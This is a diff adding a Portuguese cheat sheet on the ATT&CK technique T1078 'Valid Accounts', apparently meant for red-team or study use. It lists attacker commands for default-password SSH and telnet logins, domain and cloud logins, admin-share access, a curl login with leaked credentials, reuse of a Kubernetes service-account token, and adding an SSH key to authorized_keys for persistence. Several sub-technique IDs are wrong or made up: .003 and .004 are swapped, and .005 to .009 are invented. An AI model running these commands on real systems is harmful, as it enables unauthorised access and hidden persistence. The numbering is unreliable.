@@ -1,0 +1,112 @@
+
+# T1078 - Valid Accounts
+
+A técnica **T1078 - Valid Accounts** envolve o uso de credenciais legítimas para obter acesso a sistemas, serviços ou redes. Ao usar contas válidas, o atacante reduz a visibilidade e aumenta a furtividade, pois a atividade parece legítima.
+
+---
+
+## ✅ T1078.001 - Default Accounts
+
+```bash
+# Tentativa de login com contas padrão (Linux)
+ssh root@target -p 22
+password: toor
+
+# Tentativa com credenciais padrão conhecidas
+telnet 192.168.0.1
+login: admin
+password: admin
+```
+
+---
+
+## ✅ T1078.002 - Domain Accounts (Windows AD)
+
+```powershell
+# Autenticar em sistema com credencial de domínio
+cmdkey /add:target.domain.local /user:domain\user /pass:P@ssw0rd
+runas /netonly /user:domain\user cmd.exe
+```
+
+---
+
+## ✅ T1078.003 - Cloud Accounts
+
+```bash
+# Acesso com AWS Access Key ID/Secret
+aws configure
+AWS Access Key ID [None]: AKIA...
+AWS Secret Access Key [None]: ...
+
+# Uso para extração de buckets
+aws s3 ls
+```
+
+```bash
+# Azure CLI
+az login --username attacker@domain.com --password P@ssword123
+```
+
+---
+
+## ✅ T1078.004 - Local Accounts
+
+```bash
+# SSH com conta local
+ssh user@target -p 22
+
+# Windows - autenticação remota
+net use \\target\C$ /user:localadmin P@ssword
+```
+
+---
+
+## ✅ T1078.005 - Application Accounts
+
+```bash
+# Login em painel admin de webapp com credencial vazada
+curl -X POST https://app.target.com/login -d "user=admin&pass=admin123"
+```
+
+**Obs:** Contas de serviços ou painéis mal protegidos são alvos comuns.
+
+---
+
+## ✅ T1078.006 - Cloud Storage Accounts
+
+```bash
+# Acesso direto via rclone configurado com token
+rclone config
+rclone ls gdrive:backup
+```
+
+---
+
+## ✅ T1078.007 - Kubernetes Service Account Abuse
+
+```bash
+# Usar token do ServiceAccount para escalar
+kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) get pods --all-namespaces
+```
+
+---
+
+## ✅ T1078.008 - SSH Authorized Keys Abuse
+
+```bash
+# Adicionar chave pública para persistência
+echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
+```
+
+---
+
+## ✅ T1078.009 - MFA Bypass or Token Theft
+
+```text
+# Uso de sessão ou cookie já autenticado
+# Reaproveitamento de token de sessão: Authorization: Bearer <token>
+```
+
+---
+
+O uso de contas válidas oferece aos adversários um dos meios mais furtivos para manter acesso, movimentar-se lateralmente e executar ações sem levantar alertas imediatos.
